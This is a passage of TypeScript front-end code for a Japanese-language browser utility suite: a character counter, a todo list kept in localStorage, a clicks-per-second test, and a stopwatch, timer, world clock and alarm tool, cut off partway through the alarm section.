  const elChars = document.getElementById("cc-chars") as HTMLDivElement;
  const elCharsNs = document.getElementById("cc-chars-ns") as HTMLDivElement;
  const elBytes = document.getElementById("cc-bytes") as HTMLDivElement;
  const elLines = document.getElementById("cc-lines") as HTMLDivElement;
  const elWords = document.getElementById("cc-words") as HTMLDivElement;
  const elPara = document.getElementById("cc-paragraphs") as HTMLDivElement;
  const elFw = document.getElementById("cc-fullwidth") as HTMLDivElement;
  const elHw = document.getElementById("cc-halfwidth") as HTMLDivElement;
  const tw = document.getElementById("cc-twitter-bar") as HTMLDivElement;
  const twT = document.getElementById("cc-twitter-text") as HTMLSpanElement;
  const sm = document.getElementById("cc-sms-bar") as HTMLDivElement;
  const smT = document.getElementById("cc-sms-text") as HTMLSpanElement;
  const gk = document.getElementById("cc-genko-bar") as HTMLDivElement;
  const gkT = document.getElementById("cc-genko-text") as HTMLSpanElement;
  const breakdown = document.getElementById("cc-breakdown") as HTMLPreElement;

  function isFullWidth(c: string): boolean {
    const code = c.codePointAt(0) ?? 0;
    return (
      (code >= 0x1100 && code <= 0x115f) ||
      (code >= 0x2e80 && code <= 0x303e) ||
      (code >= 0x3041 && code <= 0x33ff) ||
      (code >= 0x3400 && code <= 0x4dbf) ||
      (code >= 0x4e00 && code <= 0x9fff) ||
      (code >= 0xa000 && code <= 0xa4cf) ||
      (code >= 0xac00 && code <= 0xd7a3) ||
      (code >= 0xf900 && code <= 0xfaff) ||
      (code >= 0xfe30 && code <= 0xfe4f) ||
      (code >= 0xff00 && code <= 0xff60) ||
      (code >= 0xffe0 && code <= 0xffe6) ||
      (code >= 0x20000 && code <= 0x2fffd) ||
      (code >= 0x30000 && code <= 0x3fffd)
    );
  }

  function recompute(): void {
    let txt = input.value;
    if (trim.checked) txt = txt.trim();
    if (collapse.checked) txt = txt.replace(/[ \t\u3000]+/g, " ");
    const codepoints = Array.from(txt);
    const chars = codepoints.length;
    const charsNs = codepoints.filter((c) => !/\s/.test(c)).length;
    const bytes = new TextEncoder().encode(txt).length;
    const lines = txt.length === 0 ? 0 : txt.split(/\r\n|\r|\n/).length;
    const words = (txt.match(/[A-Za-z0-9_'\-]+|[\p{L}\p{N}]+/gu) ?? []).length;
    const paragraphs = txt
      .split(/\n\s*\n/)
      .filter((p) => p.trim().length > 0).length;
    let fw = 0,
      hw = 0;
    let counts: Record<string, number> = {
      ひらがな: 0,
      カタカナ: 0,
      漢字: 0,
      英字: 0,
      数字: 0,
      記号: 0,
      空白: 0,
      改行: 0,
      "絵文字/その他": 0,
    };
    for (const c of codepoints) {
      if (isFullWidth(c)) fw++;
      else hw++;
      const cp = c.codePointAt(0) ?? 0;
      if (cp >= 0x3041 && cp <= 0x309f) counts["ひらがな"]++;
      else if (cp >= 0x30a0 && cp <= 0x30ff) counts["カタカナ"]++;
      else if ((cp >= 0x4e00 && cp <= 0x9fff) || (cp >= 0x3400 && cp <= 0x4dbf))
        counts["漢字"]++;
      else if (/[A-Za-z]/.test(c)) counts["英字"]++;
      else if (/[0-9]/.test(c)) counts["数字"]++;
      else if (c === "\n" || c === "\r") counts["改行"]++;
      else if (/\s/.test(c)) counts["空白"]++;
      else if (cp < 0x80) counts["記号"]++;
      else if (cp >= 0x2000 && cp < 0x3000) counts["記号"]++;
      else counts["絵文字/その他"]++;
    }
    elChars.textContent = chars.toLocaleString();
    elCharsNs.textContent = charsNs.toLocaleString();
    elBytes.textContent = bytes.toLocaleString();
    elLines.textContent = lines.toLocaleString();
    elWords.textContent = words.toLocaleString();
    elPara.textContent = paragraphs.toLocaleString();
    elFw.textContent = fw.toLocaleString();
    elHw.textContent = hw.toLocaleString();
    const twPct = Math.min(100, (chars / 280) * 100);
    tw.style.width = twPct + "%";
    tw.style.background = chars > 280 ? "#cf222e" : "#1da1f2";
    twT.textContent = `${chars} / 280`;
    const smPct = Math.min(100, (chars / 160) * 100);
    sm.style.width = smPct + "%";
    sm.style.background = chars > 160 ? "#cf222e" : "#20c997";
    smT.textContent = `${chars} / 160`;
    const sheets = chars / 400;
    gk.style.width = Math.min(100, (sheets / 5) * 100) + "%";
    gkT.textContent = `${sheets.toFixed(2)} 枚`;
    const lines2 = Object.entries(counts)
      .map(([k, v]) => `  ${k.padEnd(14, " ")} ${String(v).padStart(6, " ")}`)
      .join("\n");
    breakdown.textContent = lines2;
    status.textContent = `更新: ${new Date().toLocaleTimeString()}`;
  }

  input.addEventListener("input", recompute);
  trim.addEventListener("change", recompute);
  collapse.addEventListener("change", recompute);
  document.getElementById("cc-clear")?.addEventListener("click", () => {
    input.value = "";
    recompute();
  });
  document.getElementById("cc-copy")?.addEventListener("click", async () => {
    try {
      await navigator.clipboard.writeText(input.value);
      status.textContent = "コピーしました";
    } catch {
      status.textContent = "コピー失敗";
    }
  });
  document.getElementById("cc-paste")?.addEventListener("click", async () => {
    try {
      input.value = await navigator.clipboard.readText();
      recompute();
    } catch {
      status.textContent = "貼り付け失敗";
    }
  });
  recompute();
}

// ===== Todo =====
interface TodoItem {
  id: string;
  text: string;
  done: boolean;
  priority: "low" | "medium" | "high";
  due: string | null;
  tags: string[];
  createdAt: number;
  doneAt: number | null;
}

const TODO_STORAGE_KEY = "yuzu-todo-v1";

function setupTodoTool(): void {
  const inputTextN = document.getElementById(
    "todo-text",
  ) as HTMLInputElement | null;
  if (!inputTextN) return;
  const inputText = inputTextN;
  const inputPri = document.getElementById(
    "todo-priority",
  ) as HTMLSelectElement;
  const inputDue = document.getElementById("todo-due") as HTMLInputElement;
  const inputTags = document.getElementById("todo-tags") as HTMLInputElement;
  const btnAdd = document.getElementById("todo-add") as HTMLButtonElement;
  const filter = document.getElementById("todo-filter") as HTMLSelectElement;
  const sort = document.getElementById("todo-sort") as HTMLSelectElement;
  const search = document.getElementById("todo-search") as HTMLInputElement;
  const list = document.getElementById("todo-list") as HTMLUListElement;
  const status = document.getElementById("todo-status") as HTMLSpanElement;
  const elTotal = document.getElementById("todo-total") as HTMLElement;
  const elActive = document.getElementById("todo-active") as HTMLElement;
  const elDone = document.getElementById("todo-done") as HTMLElement;
  const elOverdue = document.getElementById("todo-overdue") as HTMLElement;
  const elProg = document.getElementById("todo-progress") as HTMLElement;
  const elProgBar = document.getElementById(
    "todo-progress-bar",
  ) as HTMLDivElement;

  let items: TodoItem[] = [];
  try {
    const raw = localStorage.getItem(TODO_STORAGE_KEY);
    if (raw) items = JSON.parse(raw);
  } catch {
    /* ignore */
  }

  function save(): void {
    try {
      localStorage.setItem(TODO_STORAGE_KEY, JSON.stringify(items));
    } catch {
      /* ignore */
    }
  }

  function isOverdue(t: TodoItem): boolean {
    if (!t.due || t.done) return false;
    return new Date(t.due + "T23:59:59").getTime() < Date.now();
  }

  function render(): void {
    const q = search.value.trim().toLowerCase();
    const f = filter.value;
    const todayStr = new Date().toISOString().slice(0, 10);
    let visible = items.filter((t) => {
      if (
        q &&
        !(
          t.text.toLowerCase().includes(q) ||
          t.tags.some((x) => x.toLowerCase().includes(q))
        )
      )
        return false;
      if (f === "active" && t.done) return false;
      if (f === "done" && !t.done) return false;
      if (f === "overdue" && !isOverdue(t)) return false;
      if (f === "today" && (!t.due || t.due > todayStr || t.done)) return false;
      return true;
    });
    const priOrder = { high: 0, medium: 1, low: 2 } as const;
    switch (sort.value) {
      case "created-asc":
        visible.sort((a, b) => a.createdAt - b.createdAt);
        break;
      case "due-asc":
        visible.sort((a, b) =>
          (a.due ?? "9999").localeCompare(b.due ?? "9999"),
        );
        break;
      case "priority":
        visible.sort((a, b) => priOrder[a.priority] - priOrder[b.priority]);
        break;
      case "alpha":
        visible.sort((a, b) => a.text.localeCompare(b.text));
        break;
      default:
        visible.sort((a, b) => b.createdAt - a.createdAt);
    }
    list.textContent = "";
    for (const t of visible) {
      const li = document.createElement("li");
      li.className = "todo-item" + (t.done ? " done" : "");
      const cb = document.createElement("input");
      cb.type = "checkbox";
      cb.checked = t.done;
      cb.addEventListener("change", () => {
        t.done = cb.checked;
        t.doneAt = cb.checked ? Date.now() : null;
        save();
        render();
      });
      const main = document.createElement("div");
      main.style.flex = "1";
      const txt = document.createElement("div");
      txt.className = "todo-text todo-pri-" + t.priority;
      txt.textContent = t.text;
      txt.addEventListener("click", () => {
        const v = prompt("タスク内容を編集", t.text);
        if (v != null) {
          t.text = v;
          save();
          render();
        }
      });
      const meta = document.createElement("div");
      meta.className = "todo-meta";
      const created = document.createElement("span");
      created.textContent = "作成: " + new Date(t.createdAt).toLocaleString();
      meta.appendChild(created);
      if (t.due) {
        const d = document.createElement("span");
        d.textContent = "期限: " + t.due;
        if (isOverdue(t)) d.className = "todo-overdue";
        meta.appendChild(d);
      }
      const priLabel = document.createElement("span");
      priLabel.textContent =
        "優先度: " +
        ({ low: "低", medium: "中", high: "高" } as Record<string, string>)[
          t.priority
        ];
      meta.appendChild(priLabel);
      for (const tag of t.tags) {
        const tg = document.createElement("span");
        tg.className = "todo-tag";
        tg.textContent = "#" + tag;
        meta.appendChild(tg);
      }
      main.appendChild(txt);
      main.appendChild(meta);
      const del = document.createElement("button");
      del.type = "button";
      del.textContent = "🗑";
      del.title = "削除";
      del.addEventListener("click", () => {
        if (!confirm("削除しますか?")) return;
        items = items.filter((x) => x.id !== t.id);
        save();
        render();
      });
      li.appendChild(cb);
      li.appendChild(main);
      li.appendChild(del);
      list.appendChild(li);
    }
    const total = items.length;
    const done = items.filter((t) => t.done).length;
    const active = total - done;
    const overdue = items.filter(isOverdue).length;
    elTotal.textContent = String(total);
    elActive.textContent = String(active);
    elDone.textContent = String(done);
    elOverdue.textContent = String(overdue);
    const pct = total === 0 ? 0 : Math.round((done / total) * 100);
    elProg.textContent = pct + "%";
    elProgBar.style.width = pct + "%";
    status.textContent = `表示 ${visible.length} / ${total}`;
  }

  function add(): void {
    const text = inputText.value.trim();
    if (!text) return;
    const item: TodoItem = {
      id: Math.random().toString(36).slice(2, 11),
      text,
      done: false,
      priority: inputPri.value as TodoItem["priority"],
      due: inputDue.value || null,
      tags: inputTags.value
        .split(/[,、]/)
        .map((s) => s.trim())
        .filter(Boolean),
      createdAt: Date.now(),
      doneAt: null,
    };
    items.push(item);
    save();
    inputText.value = "";
    inputTags.value = "";
    inputDue.value = "";
    render();
  }

  btnAdd.addEventListener("click", add);
  inputText.addEventListener("keydown", (e) => {
    if (e.key === "Enter") add();
  });
  filter.addEventListener("change", render);
  sort.addEventListener("change", render);
  search.addEventListener("input", render);
  document.getElementById("todo-clear-done")?.addEventListener("click", () => {
    if (!confirm("完了済みを全て削除しますか?")) return;
    items = items.filter((t) => !t.done);
    save();
    render();
  });
  document.getElementById("todo-export")?.addEventListener("click", () => {
    const blob = new Blob([JSON.stringify(items, null, 2)], {
      type: "application/json",
    });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = "todo-" + new Date().toISOString().slice(0, 10) + ".json";
    a.click();
    setTimeout(() => URL.revokeObjectURL(url), 1000);
  });
  const importBtn = document.getElementById("todo-import") as HTMLButtonElement;
  const importFile = document.getElementById(
    "todo-import-file",
  ) as HTMLInputElement;
  importBtn.addEventListener("click", () => importFile.click());
  importFile.addEventListener("change", async () => {
    const f = importFile.files?.[0];
    if (!f) return;
    try {
      const txt = await f.text();
      const arr = JSON.parse(txt) as TodoItem[];
      if (Array.isArray(arr)) {
        if (
          confirm(
            `${arr.length} 件をインポートします。既存に追加しますか? (キャンセル=置き換え)`,
          )
        ) {
          items = items.concat(arr);
        } else {
          items = arr;
        }
        save();
        render();
      }
    } catch (e) {
      alert("インポート失敗: " + String(e));
    }
    importFile.value = "";
  });
  render();
}

// ===== 🖱️ CPS テスト (Clicks Per Second) =====
function setupCpsTool(): void {
  const target = document.getElementById("cps-target") as HTMLDivElement | null;
  if (!target) return;
  const big = document.getElementById("cps-big") as HTMLDivElement | null;
  const sub = document.getElementById("cps-sub") as HTMLDivElement | null;
  const timerEl = document.getElementById("cps-timer") as HTMLDivElement | null;
  const countEl = document.getElementById("cps-count") as HTMLDivElement | null;
  const rateEl = document.getElementById("cps-rate") as HTMLDivElement | null;
  const peakEl = document.getElementById("cps-peak") as HTMLDivElement | null;
  const bestEl = document.getElementById("cps-best") as HTMLDivElement | null;
  const statusEl = document.getElementById(
    "cps-status",
  ) as HTMLSpanElement | null;
  const resetBtn = document.getElementById(
    "cps-reset",
  ) as HTMLButtonElement | null;
  const clearBestBtn = document.getElementById(
    "cps-clear-best",
  ) as HTMLButtonElement | null;
  const timeBtns =
    document.querySelectorAll<HTMLButtonElement>(".cps-time-btn");
  const modeBtns =
    document.querySelectorAll<HTMLButtonElement>(".cps-mode-btn");

  let durationSec = 5;
  let acceptKey = false; // モード: クリック+スペース ならスペースもカウント
  let running = false;
  let finished = false; // 終了後にクリックエリアから再スタートしないフラグ
  let startTs = 0;
  let count = 0;
  let timerId: number | null = null;
  let clickTimes: number[] = []; // 1秒窓ピーク用
  const BEST_KEY = "yuzu-cps-best-v1";

  function loadBest(): Record<string, number> {
    try {
      const raw = localStorage.getItem(BEST_KEY);
      if (!raw) return {};
      const o = JSON.parse(raw);
      return o && typeof o === "object" ? o : {};
    } catch {
      return {};
    }
  }
  function saveBest(b: Record<string, number>): void {
    try {
      localStorage.setItem(BEST_KEY, JSON.stringify(b));
    } catch {
      /* ignore */
    }
  }
  function refreshBestDisplay(): void {
    if (!bestEl) return;
    const b = loadBest();
    const cur = b[String(durationSec)];
    bestEl.textContent = cur
      ? `${cur.toFixed(2)} (${durationSec}秒)`
      : `― (${durationSec}秒)`;
  }

  function setActive(
    btns: NodeListOf<HTMLButtonElement>,
    key: string,
    val: string,
  ): void {
    btns.forEach((b) => {
      const cur = b.dataset[key as keyof DOMStringMap];
      const on = cur === val;
      b.style.background = on ? "rgba(76, 175, 80, 0.4)" : "";
      b.style.fontWeight = on ? "bold" : "";
    });
  }

  timeBtns.forEach((b) => {
    if (b.dataset.default === "1") {
      durationSec = parseInt(b.dataset.sec || "5", 10);
    }
    b.addEventListener("click", () => {
      if (running) return;
      durationSec = parseInt(b.dataset.sec || "5", 10);
      setActive(timeBtns, "sec", String(durationSec));
      reset();
      refreshBestDisplay();
    });
  });
  modeBtns.forEach((b) => {
    if (b.dataset.default === "1") {
      acceptKey = b.dataset.mode === "any";
    }
    b.addEventListener("click", () => {
      if (running) return;
      acceptKey = b.dataset.mode === "any";
      setActive(modeBtns, "mode", b.dataset.mode || "click");
      if (sub)
        sub.textContent = acceptKey
          ? "ここをクリック または スペースキーで開始"
          : "ここをクリックして開始";
    });
  });
  setActive(timeBtns, "sec", String(durationSec));
  setActive(modeBtns, "mode", acceptKey ? "any" : "click");

  function reset(): void {
    if (timerId !== null) {
      window.clearInterval(timerId);
      timerId = null;
    }
    running = false;
    startTs = 0;
    count = 0;
    clickTimes = [];
    if (countEl) countEl.textContent = "0";
    if (rateEl) rateEl.textContent = "0.00";
    if (peakEl) peakEl.textContent = "0.00";
    if (timerEl) timerEl.textContent = `残り ${durationSec.toFixed(2)} 秒`;
    if (big) big.textContent = "CLICK";
    if (sub)
      sub.textContent = acceptKey
        ? "ここをクリック または スペースキーで開始"
        : "ここをクリックして開始";
    finished = false;
    if (statusEl) statusEl.textContent = "";
    target.style.background =
      "linear-gradient(135deg, rgba(33, 150, 243, 0.15), rgba(76, 175, 80, 0.15))";
  }

  function tick(): void {
    if (!running) return;
    const now = performance.now();
    const elapsed = (now - startTs) / 1000;
    const remain = Math.max(0, durationSec - elapsed);
    if (timerEl) timerEl.textContent = `残り ${remain.toFixed(2)} 秒`;
    if (rateEl && elapsed > 0)
      rateEl.textContent = (count / elapsed).toFixed(2);
    // 1 秒窓のピーク CPS を計算
    const cutoff = now - 1000;
    while (clickTimes.length > 0 && clickTimes[0] < cutoff) clickTimes.shift();
    const peak = clickTimes.length;
    if (peakEl) {
      const prev = parseFloat(peakEl.textContent || "0");
      if (peak > prev) peakEl.textContent = peak.toFixed(2);
    }
    if (remain <= 0) finish();
  }

  function finish(): void {
    running = false;
    if (timerId !== null) {
      window.clearInterval(timerId);
      timerId = null;
    }
    const elapsed = durationSec;
    const cps = count / elapsed;
    if (rateEl) rateEl.textContent = cps.toFixed(2);
    if (timerEl) timerEl.textContent = `終了 (${elapsed.toFixed(0)}秒)`;
    finished = true;
    if (big) big.textContent = `${cps.toFixed(2)} CPS`;
    if (sub)
      sub.textContent = `${count} 回 / ${elapsed}秒 — 「リセット」でもう一度`;
    target.style.background =
      "linear-gradient(135deg, rgba(255, 152, 0, 0.18), rgba(244, 67, 54, 0.18))";
    const best = loadBest();
    const key = String(durationSec);
    if (!best[key] || cps > best[key]) {
      best[key] = cps;
      saveBest(best);
      if (statusEl) statusEl.textContent = `🏆 新記録! (${cps.toFixed(2)} CPS)`;
    } else {
      if (statusEl)
        statusEl.textContent = `ベスト: ${best[key].toFixed(2)} CPS`;
    }
    refreshBestDisplay();
  }

  function start(): void {
    running = true;
    startTs = performance.now();
    count = 1; // この呼び出し自体を 1 クリックとして数える
    clickTimes = [startTs];
    if (countEl) countEl.textContent = "1";
    if (rateEl) rateEl.textContent = "0.00";
    if (peakEl) peakEl.textContent = "0.00";
    if (sub) sub.textContent = "全力でクリック!";
    if (statusEl) statusEl.textContent = "";
    target.style.background =
      "linear-gradient(135deg, rgba(76, 175, 80, 0.25), rgba(33, 150, 243, 0.25))";
    timerId = window.setInterval(tick, 50);
  }

  function click(): void {
    if (!running) {
      if (finished) return; // 終了後はクリックエリアから再スタートしない
      start();
      return;
    }
    count += 1;
    clickTimes.push(performance.now());
    if (countEl) countEl.textContent = String(count);
    // 視覚フィードバック
    if (big) big.textContent = String(count);
    target.style.background =
      "linear-gradient(135deg, rgba(76, 175, 80, 0.35), rgba(33, 150, 243, 0.35))";
    window.setTimeout(() => {
      if (running) {
        target.style.background =
          "linear-gradient(135deg, rgba(76, 175, 80, 0.25), rgba(33, 150, 243, 0.25))";
      }
    }, 30);
  }

  target.addEventListener("mousedown", (e) => {
    if (e.button !== 0) return;
    e.preventDefault();
    target.focus();
    click();
  });
  target.addEventListener("keydown", (e) => {
    if (!acceptKey) return;
    if (e.code === "Space" || e.key === " ") {
      e.preventDefault();
      click();
    }
  });
  resetBtn?.addEventListener("click", () => {
    reset();
  });
  clearBestBtn?.addEventListener("click", () => {
    if (!confirm("ベスト記録を全てクリアしますか?")) return;
    saveBest({});
    refreshBestDisplay();
    if (statusEl) statusEl.textContent = "ベスト記録をクリアしました";
  });

  reset();
  refreshBestDisplay();
}

// ===== クロック =====
function setupClockTool(): void {
  const tabs = document.querySelectorAll<HTMLButtonElement>(".cl-tab");
  if (tabs.length === 0) return;
  const panes = document.querySelectorAll<HTMLDivElement>(".cl-pane");
  function showPane(id: string): void {
    tabs.forEach((b) => b.classList.toggle("active", b.dataset.clTab === id));
    panes.forEach((p) => {
      p.hidden = p.dataset.clPane !== id;
    });
  }
  tabs.forEach((b) =>
    b.addEventListener("click", () => showPane(b.dataset.clTab ?? "stopwatch")),
  );
  showPane("stopwatch");

  // ---- ストップウォッチ ----
  const swDisp = document.getElementById("cl-sw-display") as HTMLDivElement;
  const swStart = document.getElementById("cl-sw-start") as HTMLButtonElement;
  const swLap = document.getElementById("cl-sw-lap") as HTMLButtonElement;
  const swReset = document.getElementById("cl-sw-reset") as HTMLButtonElement;
  const swLapsBody = (
    document.getElementById("cl-sw-laps") as HTMLTableElement
  ).querySelector("tbody") as HTMLTableSectionElement;
  let swStartTs = 0;
  let swElapsedBeforePause = 0;
  let swRunning = false;
  let swTimer: number | null = null;
  const swLaps: number[] = [];
  function fmtMs(ms: number): string {
    const h = Math.floor(ms / 3600000);
    const m = Math.floor((ms % 3600000) / 60000);
    const s = Math.floor((ms % 60000) / 1000);
    const x = Math.floor(ms % 1000);
    return `${String(h).padStart(2, "0")}:${String(m).padStart(2, "0")}:${String(s).padStart(2, "0")}.${String(x).padStart(3, "0")}`;
  }
  function swElapsed(): number {
    return swRunning
      ? swElapsedBeforePause + (Date.now() - swStartTs)
      : swElapsedBeforePause;
  }
  function swTick(): void {
    swDisp.textContent = fmtMs(swElapsed());
  }
  swStart.addEventListener("click", () => {
    if (swRunning) {
      swElapsedBeforePause += Date.now() - swStartTs;
      swRunning = false;
      if (swTimer) {
        clearInterval(swTimer);
        swTimer = null;
      }
      swStart.textContent = "▶ 再開";
    } else {
      swStartTs = Date.now();
      swRunning = true;
      swTimer = window.setInterval(swTick, 31);
      swStart.textContent = "⏸ 停止";
    }
  });
  swLap.addEventListener("click", () => {
    const t = swElapsed();
    swLaps.push(t);
    const tr = document.createElement("tr");
    const idx = swLaps.length;
    const lapDelta = idx === 1 ? t : t - swLaps[idx - 2];
    tr.innerHTML = `<td style="padding:4px">${idx}</td><td style="padding:4px;text-align:right;font-family:monospace">${fmtMs(lapDelta)}</td><td style="padding:4px;text-align:right;font-family:monospace">${fmtMs(t)}</td>`;
    swLapsBody.insertBefore(tr, swLapsBody.firstChild);
  });
  swReset.addEventListener("click", () => {
    swRunning = false;
    swElapsedBeforePause = 0;
    if (swTimer) {
      clearInterval(swTimer);
      swTimer = null;
    }
    swLaps.length = 0;
    swLapsBody.textContent = "";
    swStart.textContent = "▶ スタート";
    swTick();
  });
  swTick();

  // ---- タイマー ----
  const tmH = document.getElementById("cl-tm-h") as HTMLInputElement;
  const tmM = document.getElementById("cl-tm-m") as HTMLInputElement;
  const tmS = document.getElementById("cl-tm-s") as HTMLInputElement;
  const tmDisp = document.getElementById("cl-tm-display") as HTMLDivElement;
  const tmBar = document.getElementById("cl-tm-bar") as HTMLDivElement;
  const tmStart = document.getElementById("cl-tm-start") as HTMLButtonElement;
  const tmPause = document.getElementById("cl-tm-pause") as HTMLButtonElement;
  const tmReset = document.getElementById("cl-tm-reset") as HTMLButtonElement;
  const tmStatus = document.getElementById("cl-tm-status") as HTMLSpanElement;
  const tmBeep = document.getElementById("cl-tm-beep") as HTMLInputElement;
  const tmLoop = document.getElementById("cl-tm-loop") as HTMLInputElement;
  let tmTotalMs = 0;
  let tmRemainingMs = 0;
  let tmEndAt = 0;
  let tmRunning = false;
  let tmTimer: number | null = null;
  function tmReadInputs(): number {
    return (
      (parseInt(tmH.value || "0") * 3600 +
        parseInt(tmM.value || "0") * 60 +
        parseInt(tmS.value || "0")) *
      1000
    );
  }
  function tmFmt(ms: number): string {
    if (ms < 0) ms = 0;
    const h = Math.floor(ms / 3600000);
    const m = Math.floor((ms % 3600000) / 60000);
    const s = Math.floor((ms % 60000) / 1000);
    return `${String(h).padStart(2, "0")}:${String(m).padStart(2, "0")}:${String(s).padStart(2, "0")}`;
  }
  function tmRender(): void {
    tmDisp.textContent = tmFmt(tmRemainingMs);
    const pct = tmTotalMs === 0 ? 0 : (tmRemainingMs / tmTotalMs) * 100;
    tmBar.style.width = Math.max(0, Math.min(100, pct)) + "%";
  }
  function tmBeepSound(): void {
    try {
      const ctx = new (
        window.AudioContext || (window as any).webkitAudioContext
      )();
      for (let i = 0; i < 3; i++) {
        const osc = ctx.createOscillator();
        const gain = ctx.createGain();
        osc.frequency.value = 880;
        osc.type = "sine";
        gain.gain.value = 0.3;
        osc.connect(gain).connect(ctx.destination);
        osc.start(ctx.currentTime + i * 0.4);
        osc.stop(ctx.currentTime + i * 0.4 + 0.25);
      }
      setTimeout(() => ctx.close(), 2000);
    } catch {
      /* ignore */
    }
  }
  function tmFinish(): void {
    tmRunning = false;
    if (tmTimer) {
      clearInterval(tmTimer);
      tmTimer = null;
    }
    tmRemainingMs = 0;
    tmRender();
    tmStatus.textContent = "⏰ タイマー終了";
    if (tmBeep.checked) tmBeepSound();
    if ("Notification" in window) {
      try {
        if (Notification.permission === "granted")
          new Notification("⏰ タイマー終了");
        else if (Notification.permission !== "denied")
          Notification.requestPermission().then((p) => {
            if (p === "granted") new Notification("⏰ タイマー終了");
          });
      } catch {
        /* ignore */
      }
    }
    if (tmLoop.checked) {
      tmTotalMs = tmReadInputs();
      tmRemainingMs = tmTotalMs;
      tmStart.click();
    }
  }
  function tmTick(): void {
    tmRemainingMs = tmEndAt - Date.now();
    if (tmRemainingMs <= 0) {
      tmFinish();
      return;
    }
    tmRender();
  }
  tmStart.addEventListener("click", () => {
    if (tmRunning) return;
    if (tmRemainingMs <= 0) {
      tmTotalMs = tmReadInputs();
      tmRemainingMs = tmTotalMs;
    }
    if (tmRemainingMs <= 0) {
      tmStatus.textContent = "時間を設定してください";
      return;
    }
    tmEndAt = Date.now() + tmRemainingMs;
    tmRunning = true;
    tmTimer = window.setInterval(tmTick, 200);
    tmStatus.textContent = "実行中…";
  });
  tmPause.addEventListener("click", () => {
    if (!tmRunning) return;
    tmRemainingMs = tmEndAt - Date.now();
    tmRunning = false;
    if (tmTimer) {
      clearInterval(tmTimer);
      tmTimer = null;
    }
    tmStatus.textContent = "一時停止中";
  });
  tmReset.addEventListener("click", () => {
    tmRunning = false;
    if (tmTimer) {
      clearInterval(tmTimer);
      tmTimer = null;
    }
    tmTotalMs = tmReadInputs();
    tmRemainingMs = tmTotalMs;
    tmRender();
    tmStatus.textContent = "";
  });
  document
    .querySelectorAll<HTMLButtonElement>(".cl-tm-preset")
    .forEach((btn) => {
      btn.addEventListener("click", () => {
        const sec = parseInt(btn.dataset.sec ?? "0");
        tmH.value = String(Math.floor(sec / 3600));
        tmM.value = String(Math.floor((sec % 3600) / 60));
        tmS.value = String(sec % 60);
        tmTotalMs = sec * 1000;
        tmRemainingMs = tmTotalMs;
        tmRender();
      });
    });
  [tmH, tmM, tmS].forEach((el) =>
    el.addEventListener("input", () => {
      if (!tmRunning) {
        tmTotalMs = tmReadInputs();
        tmRemainingMs = tmTotalMs;
        tmRender();
      }
    }),
  );
  tmTotalMs = tmReadInputs();
  tmRemainingMs = tmTotalMs;
  tmRender();

  // ---- 世界時計 ----
  const WC_KEY = "yuzu-clock-tz-v1";
  const wcList = document.getElementById("cl-wc-list") as HTMLUListElement;
  const wcAdd = document.getElementById("cl-wc-add") as HTMLInputElement;
  const wcAddBtn = document.getElementById(
    "cl-wc-add-btn",
  ) as HTMLButtonElement;
  const defaultTzs = [
    "Asia/Tokyo",
    "America/New_York",
    "America/Los_Angeles",
    "Europe/London",
    "Europe/Paris",
    "Asia/Shanghai",
    "Australia/Sydney",
  ];
  let tzs: string[] = defaultTzs;
  try {
    const raw = localStorage.getItem(WC_KEY);
    if (raw) tzs = JSON.parse(raw);
  } catch {
    /* ignore */
  }
  function wcRender(): void {
    wcList.textContent = "";
    const now = new Date();
    for (const tz of tzs) {
      const li = document.createElement("li");
      li.className = "cl-wc-item";
      let timeStr = "";
      let dateStr = "";
      try {
        timeStr = new Intl.DateTimeFormat("ja-JP", {
          timeZone: tz,
          hour: "2-digit",
          minute: "2-digit",
          second: "2-digit",
          hour12: false,
        }).format(now);
        dateStr = new Intl.DateTimeFormat("ja-JP", {
          timeZone: tz,
          year: "numeric",
          month: "2-digit",
          day: "2-digit",
          weekday: "short",
        }).format(now);
      } catch {
        timeStr = "(invalid TZ)";
      }
      li.innerHTML = `<div style="flex:1"><div style="font-weight:bold">${tz}</div><div style="font-size:11px;color:#666">${dateStr}</div></div><div style="font-family:ui-monospace,Consolas,monospace;font-size:24px">${timeStr}</div>`;
      const del = document.createElement("button");
      del.type = "button";
      del.textContent = "✖";
      del.addEventListener("click", () => {
        tzs = tzs.filter((x) => x !== tz);
        localStorage.setItem(WC_KEY, JSON.stringify(tzs));
        wcRender();
      });
      li.appendChild(del);
      wcList.appendChild(li);
    }
  }
  wcAddBtn.addEventListener("click", () => {
    const v = wcAdd.value.trim();
    if (!v) return;
    try {
      new Intl.DateTimeFormat("ja-JP", { timeZone: v });
    } catch {
      alert("無効なタイムゾーンです");
      return;
    }
    if (!tzs.includes(v)) tzs.push(v);
    localStorage.setItem(WC_KEY, JSON.stringify(tzs));
    wcAdd.value = "";
    wcRender();
  });
  document.getElementById("cl-wc-reset-btn")?.addEventListener("click", () => {
    tzs = defaultTzs.slice();
    localStorage.setItem(WC_KEY, JSON.stringify(tzs));
    wcRender();
  });
  wcRender();
  setInterval(wcRender, 1000);

  // ---- アラーム ----
  const AL_KEY = "yuzu-clock-alarm-v1";
  interface Alarm {
    id: string;
    time: string;
    label: string;
    enabled: boolean;
    lastFired: string | null;
  }
  let alarms: Alarm[] = [];
  try {
    const raw = localStorage.getItem(AL_KEY);
    if (raw) alarms = JSON.parse(raw);
  } catch {
    /* ignore */
  }
  const alList = document.getElementById("cl-al-list") as HTMLUListElement;
  function alSave(): void {
    localStorage.setItem(AL_KEY, JSON.stringify(alarms));
  }
  function alRender(): void {
    alList.textContent = "";
    for (const a of alarms) {
      const li = document.createElement("li");
      li.className = "cl-al-item";
      const cb = document.createElement("input");
      cb.type = "checkbox";
      cb.checked = a.enabled;
      cb.addEventListener("change", () => {
        a.enabled = cb.checked;
        alSave();
      });
      const main = document.createElement("div");
      main.style.flex = "1";
      main.innerHTML = `<div style="font-family:ui-monospace,Consolas,monospace;font-size:20px">${a.time}</div><div style="font-size:11px;color:#666">${a.label || "(無題)"}</div>`;
      const del = document.createElement("button");
      del.type = "button";
      del.textContent = "✖";
      del.addEventListener("click", () => {
        alarms = alarms.filter((x) => x.id !== a.id);
        alSave();
        alRender();
      });
      li.appendChild(cb);
      li.appendChild(main);
      li.appendChild(del);
      alList.appendChild(li);
    }
  }
  document.getElementById("cl-al-add")?.addEventListener("click", () => {
    const t = (document.getElementById("cl-al-time") as HTMLInputElement).value;
    const lab = (document.getElementById("cl-al-label") as HTMLInputElement)
      .value;
    if (!t) {
      alert("時刻を入力してください");
      return;
    }
    alarms.push({
      id: Math.random().toString(36).slice(2, 11),
      time: t,
      label: lab,
      enabled: true,
      lastFired: null,
    });
    alSave();
    alRender();
  });
  alRender();
